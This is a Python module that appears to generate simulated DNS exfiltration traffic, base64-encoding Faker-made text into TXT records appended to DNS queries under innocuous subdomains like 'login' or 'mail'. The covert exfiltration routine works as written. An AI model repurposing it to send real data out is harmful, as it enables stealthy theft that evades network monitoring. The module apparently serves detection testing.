import asyncio
from base64 import b64encode
import random

import dns

from tdns.exfil import exfil, SEND_NO_WAIT, MAX_QNAME_SIZE


class fastervec(exfil):

    idchar = 'a'

    def __init__(self, udp, resolver_addr, amount=100, time=60, sentences=10,
                 subdomain=None, random_delay=False, prepend=True):
        '''
        args:
            udp: Whether to use UDP or TCP for the DNS queries.

            sentences: Number of sentences to generate for each query
                       (Faker's paragraph's `nb_sentences`).

            subdomain: The subdomain to use for the exfiltration queries.
                       If None, one is picked from [www, login, auth, mail]
        '''
        super().__init__(
            amount, time, SEND_NO_WAIT,
            resolver_addr, random_delay, prepend, udp=udp)
        self.innocent_string = random.choice(
            ['www', 'login', 'auth', 'mail']) if subdomain is None\
            else subdomain
        self.sentences = sentences

    def encode(self, text: str):
        return b64encode(text.encode('ASCII'))

    def exfiltrate(self, text):
        to_send = self.encode(text).decode()
        split = [to_send[i:i+MAX_QNAME_SIZE]
                 for i in range(0, len(to_send), MAX_QNAME_SIZE)]
        qname = f'{self.innocent_string}.{self.domain}'
        msg = dns.message.make_query(qname, self.record_type)

        for i in range(len(split)):
            msg.additional.append(dns.rrset.from_text(
                f'{self.innocent_string}{i}.{self.domain}',
                0, 1, 16, split[i]))

        return msg

    async def call__aux(self):
        if self.udp:
            self.method = dns.asyncquery.udp
        else:
            self.method = dns.asyncquery.tcp

        while self.amount > 0:
            text = self.data.paragraph(nb_sentences=self.sentences)
            msg = self.exfiltrate(text)
            msg.origin = dns.name.Name([b''])
            await self.method(msg, self.resolver_addr)
            await asyncio.sleep(self.delay())
            self.amount -= 1
